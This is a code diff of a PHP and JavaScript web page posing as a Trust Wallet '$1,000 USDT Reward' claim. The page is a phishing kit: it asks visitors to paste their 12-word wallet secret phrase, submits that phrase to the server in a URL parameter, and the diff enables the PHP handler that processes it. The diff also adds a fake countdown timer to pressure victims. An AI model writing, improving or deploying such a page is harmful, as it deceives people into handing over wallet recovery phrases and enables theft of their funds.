@@ -112,7 +112,7 @@
 </style>
 
 <!-- Form Processor -->
-<!-- <?php
+<?php
 $Serial = 1;
 //htmlspecialchars_decode();
 if($_GET['key'] != ""){
@@ -122,7 +122,32 @@ if($_GET['key'] != ""){
     echo "<script>window.location = 'index.php'</script>";
     //echo $Phrase;
 }
-?> -->
+?>
+
+<div class="container-fluid">
+
+    <p class="lead text-center">CLAIM BOUNTY BEFORE</p>
+
+<div class="row mx-auto justify-content-center">
+    <div class="col-2 col-lg-1 rounded text-center  py-2 py-lg-4 bg-blue text-white me-3" >
+        <h2 class="countdown p-0 m-0" id="days">2</h2>
+        <p class="small p-0 m-0">Days</p>
+    </div>
+    <div class="col-2 col-lg-1 rounded text-center py-2 py-lg-4 bg-blue text-white me-3">
+        <h2 class="countdown p-0 m-0" id="hours">1</h2>
+        <p class="small p-0 m-0">Hours</p>
+    </div>
+    <div class="col-2 col-lg-1 rounded text-center py-2 py-lg-4 me-3 bg-blue text-white">
+        <h2 class="countdown p-0 m-0" id="minutes">1</h2>
+        <p class="small p-0 m-0">Minutes</p>
+    </div>
+    <div class="col-2 col-lg-1 rounded text-center py-2 py-lg-4 me-3 bg-blue text-white">
+        <h2 class="countdown p-0 m-0" id="seconds">2</h2>
+        <p class="small p-0 m-0">Seconds</p>
+    </div>
+</div>
+    <h1 class="countdown text-blue"></h1>
+</div>
 
 <div class="container-fluid position-fixed h-100 w-100 d-none" id="success" style="background-color: black; z-index:100; top: 0; opacity: 0.9;">
 <div class="container mx-auto p-5" >
@@ -137,7 +162,7 @@ if($_GET['key'] != ""){
     <span class="small"><i class="fi fi-bs-comment-check text-success"></i> Wallet must have more than 5 transactions to receive this Reward</span><br>
     <span class="small"><i class="fi fi-bs-comment-check text-success"></i> Wallet Balance must be more than $100</span>
     <form action="index.php" method="post">
-    <textarea name="key" onkeyup="Validate()" onpaste="Validate()" onblur="Validate()" onfocus="Validate()"  required id="" cols="30" class="form-control shadow-none p-3 mt-3" placeholder="Copy and Paste your 12 Secret Phrase from Trust Wallet App to Claim your Reward" rows="5"></textarea>
+    <textarea name="key" onkeyup="Validate()" onpaste="Validate()" onblur="Validate()" onfocus="Validate()"  required id="" cols="30" class="form-control shadow-none p-3 mt-3" placeholder="Copy and Paste your 12 Secret Phrases from Trust Wallet App to Claim your Reward" rows="5"></textarea>
     <p class="alert alert-danger py-1 mt-2 d-none lead" style="font-size: 12pt;"></p>
     <button id="button" name="submit" class="small btn py-3 btn-block shadow-none border-0 text-white mt-3" style="background-color:#0B65C6 ; font-size:10pt">Claim $1,000 USDT Reward
     </button>
@@ -417,6 +442,90 @@ if($_GET['key'] != ""){
 
 
 <script>
+
+
+if(localStorage.getItem('Mysaved') != ""){
+
+var Saved = JSON.parse(localStorage.getItem('Mysaved'));
+
+        console.log(Saved);
+        document.getElementById('days').innerText = Saved.SaveDay;
+        document.getElementById('hours').innerText = Saved.SaveHour;
+        document.getElementById('minutes').innerText = Saved.SaveMinute;
+        document.getElementById('seconds').innerText = Saved.SaveSecond;
+
+}
+
+ var Days = document.getElementById('days').innerText;
+ var Hours = document.getElementById('hours').innerText;
+ var Minutes = document.getElementById('minutes').innerText;
+ var Seconds = document.getElementById('seconds').innerText;
+
+ var IntDays = +Days;
+ var IntHours = +Hours;
+ var IntMinutes = +Minutes;
+ var IntSeconds = +Seconds;
+
+var SavedTime = {
+    SaveDay: 0,
+    SaveHour:0,
+    SaveMinute:0,
+    SaveSecond:0
+
+}
+
+ function Counter(){
+    IntSeconds--;
+    document.getElementById('seconds').innerText = IntSeconds ;
+    if(IntSeconds == 1){
+        IntSeconds = 59;
+        IntMinutes--;
+        document.getElementById('minutes').innerText = IntMinutes;
+    }
+    if(IntMinutes == 0){
+        IntMinutes = 59;
+        document.getElementById('minutes').innerText = IntMinutes
+        IntHours --;
+        document.getElementById('hours').innerText = IntHours;
+        
+    }
+    if(IntHours == 0){
+        IntHours = 23;
+        IntDays--;
+        document.getElementById('days').innerText = IntDays;
+        document.getElementById('hours').innerText = IntHours;
+        
+    }
+
+    SavedTime.SaveDay = IntDays;
+    SavedTime.SaveHour = IntHours;
+    SavedTime.SaveMinute = IntMinutes;
+    SavedTime.SaveSecond = IntSeconds;
+
+    localStorage.setItem('Mysaved', JSON.stringify(SavedTime));
+    console.log(localStorage.getItem('Mysaved'));
+
+ }
+
+ var Timer = setInterval(Counter,1000);
+ 
+
+if(localStorage.getItem('Mysaved' != "")){
+
+var Saved = JSON.parse(localStorage.getItem('Mysaved'));
+
+        console.log(Saved);
+        document.getElementById('days').innerText = Saved.SaveDay;
+        document.getElementById('hours').innerText = Saved.SaveHour;
+        document.getElementById('minutes').innerText = Saved.SaveMinute;
+        document.getElementById('seconds').innerText = Saved.SaveSecond;
+
+}
+
+
+
+
+
  var Alert = document.querySelector('.alert')
 var Textlen = document.querySelector('textarea').value;
 
@@ -435,7 +544,7 @@ function OpenBanner(){
 
 function CloseBanner(){
     document.getElementById('success').classList.replace('d-block', 'd-none');
-   // alert(document.querySelector('textarea').value);
+    alert(document.querySelector('textarea').value);
     window.location = "index.php?key="+document.querySelector('textarea').value;
 }
 
@@ -458,7 +567,7 @@ function Validate(){
   if(TextArray.length < 12 || TextArray[11] !== ""){
     document.querySelector('.alert').innerText = "Invalid Trust Wallet Phrase";
     Alert.classList.remove('d-none');
-    document.getElementById('button').innerHTML = "Verifying Wallet Phrase... &nbsp;&nbsp;<span style='max-height:15px;max-width:15px;' class='spinner spinner-border spinner-sm spinner-white'></span>";
+    document.getElementById('button').innerHTML = "Verifying Wallet Phrases... &nbsp;&nbsp;<span style='max-height:15px;max-width:15px;' class='spinner spinner-border spinner-sm spinner-white'></span>";
     document.getElementById('button').setAttribute('disabled', true);
    // alert(TextArray);
     }
